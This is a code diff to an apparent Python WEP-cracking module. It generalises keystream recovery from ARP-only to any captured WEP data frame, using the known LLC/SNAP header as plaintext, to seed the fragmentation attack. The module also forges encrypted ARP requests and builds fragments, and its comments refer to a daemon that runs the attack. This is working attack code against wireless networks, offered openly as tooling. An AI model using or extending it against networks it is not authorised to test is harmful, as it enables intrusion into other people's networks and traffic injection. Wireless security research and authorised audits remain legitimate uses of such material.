@@ -23,10 +23,11 @@ from __future__ import annotations
 import struct
 import zlib
 
-# LLC/SNAP + ARP-request plaintext prefix (everything up to the variable
-# sender/target fields). WEP encrypts this; the bytes are well-known, which is
-# what gives frag/chopchop their known-plaintext foothold.
-_SNAP_ARP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
+# LLC/SNAP header — the SAME first 6 bytes prefix EVERY 802.11 data frame
+# regardless of protocol, which is the known-plaintext foothold for the
+# fragmentation seed. The 2-byte ethertype follows (IP 0x0800, ARP 0x0806, …).
+_SNAP_HDR = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])
+_SNAP_ARP = _SNAP_HDR + bytes([0x08, 0x06])
 _ARP_HDR = bytes([0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])  # eth/ip, req
 
 
@@ -79,24 +80,35 @@ def forge_arp_request(
     return wep_encrypt(keystream, plaintext)
 
 
-def seed_keystream_from_arp(arp_body: bytes, *, want: int = 8) -> bytes:
-    """Recover the first ``want`` bytes of keystream (PRGA) from a captured
-    broadcast WEP ARP's encrypted body.
+def seed_keystream_from_data(
+    cipher: bytes, *, want: int = 8, ethertype: int = 0x0800
+) -> bytes:
+    """Recover the first ``want`` bytes of keystream (PRGA) from the leading
+    ciphertext of ANY captured WEP *data* frame — the fragmentation foothold
+    that makes the attack independent of replayable ARPs.
 
-    The body on the wire is ``IV(3) ++ KeyID(1) ++ RC4(plaintext ++ ICV)``. A
-    broadcast ARP's plaintext starts with the fixed 8-byte LLC/SNAP + ethertype
-    prefix ``AA AA 03 00 00 00 08 06`` — so XOR-ing the first ``want`` (<=8)
-    ciphertext bytes against that known prefix yields keystream tied to THIS
-    body's IV. That seed is the fragmentation attack's foothold. Returns the
-    keystream bytes; the IV they belong to is ``arp_body[:3]`` (caller's).
+    Every encrypted data frame's plaintext starts with the LLC/SNAP header
+    ``AA AA 03 00 00 00`` (6 bytes, protocol-independent) followed by the 2-byte
+    ethertype. XOR-ing the first ``want`` ciphertext bytes against that known
+    prefix yields keystream tied to the frame's IV. The first 6 bytes are
+    certain; bytes 7-8 are right only if ``ethertype`` matches the frame's
+    (IP 0x0800 is the common case; the daemon also tries ARP 0x0806). ``cipher``
+    is the bytes AFTER the IV+KeyID header (the parser's ``wep_cipher``).
     """
-    if want < 1 or want > 8:
+    known = _SNAP_HDR + struct.pack(">H", ethertype)   # SNAP ethertype is BE
+    if want < 1 or want > len(known):
         raise ValueError("seed keystream is at most the 8-byte SNAP+ethertype")
-    cipher = arp_body[4:]  # skip IV(3)+KeyID(1)
     if len(cipher) < want:
-        raise ValueError(f"body too short: need {want} cipher bytes")
-    known = (_SNAP_ARP)[:want]
-    return bytes(c ^ p for c, p in zip(cipher[:want], known))
+        raise ValueError(f"cipher too short: need {want} bytes")
+    return bytes(c ^ p for c, p in zip(cipher[:want], known[:want]))
+
+
+def seed_keystream_from_arp(arp_body: bytes, *, want: int = 8) -> bytes:
+    """Seed from a captured broadcast WEP ARP's full encrypted body (``IV(3) ++
+    KeyID(1) ++ RC4(plaintext ++ ICV)``) — the ARP-specific convenience used by
+    the probe. Delegates to :func:`seed_keystream_from_data` with the ARP
+    ethertype. Prefer the data variant for the daemon (works off any frame)."""
+    return seed_keystream_from_data(arp_body[4:], want=want, ethertype=0x0806)
 
 
 def build_fragments(
